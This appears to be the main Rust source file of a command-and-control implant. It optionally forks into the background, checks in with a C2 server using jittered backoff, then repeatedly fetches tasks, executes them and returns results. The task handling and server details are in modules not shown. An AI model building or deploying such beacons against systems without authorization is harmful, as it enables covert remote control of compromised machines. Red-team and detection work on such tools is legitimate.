use std::{env, error::Error, thread};
use crate::agent::{Agent,calculate_sleep_interval};
pub mod util;
mod agent;
mod tasking;
// #![windows_subsystem="windows"]
fn main() {
    agent_execution().unwrap();
}

fn agent_execution()->Result<(),Box<dyn Error>>{
    if let Some(daemonize)=option_env!("daemonize"){
        if daemonize.eq_ignore_ascii_case("true"){
            #[cfg(target_os="linux")]
            if unsafe{libc::fork()}==0{
                beacon_loop()?;
            }
            return Ok(());
        }
    }
    beacon_loop()?;
    Ok(())
}

fn beacon_loop()->Result<(),Box<dyn Error>>{
    let mut agent=Agent::new();
    let mut tries=0;
    //TODO: get retries, delay, jitter from configured variables
    let mut delay={
        match env::var("delay"){
            Ok(str_retries)=>str_retries.parse::<u64>().unwrap_or(10000),
            Err(_)=>10000,
        }
    };
    let mut jitter={
        match env::var("jitter"){
            Ok(str_retries)=>str_retries.parse::<u64>().unwrap_or(1000),
            Err(_)=>1000,
        }
    };
    let retries={
        match env::var("retries"){
            Ok(str_retries)=>str_retries.parse::<u64>().unwrap_or(5),
            Err(_)=>5,
        }
    };
    //reattempt C2 initial checkin if server connection cannot be established
    loop{
        if agent.checkin().is_ok(){
            break;
        }
        let interval=calculate_sleep_interval(delay, jitter);
        std::thread::sleep(std::time::Duration::from_millis(interval));
        tries+=1;
        if tries>=retries{
            return Ok(());
        }
        delay*=2;
    }   
    loop{
        //get pending task
        let pending_tasks=agent.get_tasks(retries)?;
        //parse task
        agent.tasking.parse_tasks(pending_tasks.as_ref(), &mut agent.shared_data)?;
        //Collect all completed tasks and send back to server
        let completed_tasks=agent.tasking.get_completed_tasks()?;
        let continued_tasks=agent.send_results(&completed_tasks)?;
        //Pass along continued tasking
        agent.tasking.parse_tasks(continued_tasks.as_ref(), &mut agent.shared_data)?;
        
        //Break out of loop if exit flag true
        if agent.shared_data.exit{
            break;
        }
        agent.sleep();
    }
    Ok(())
}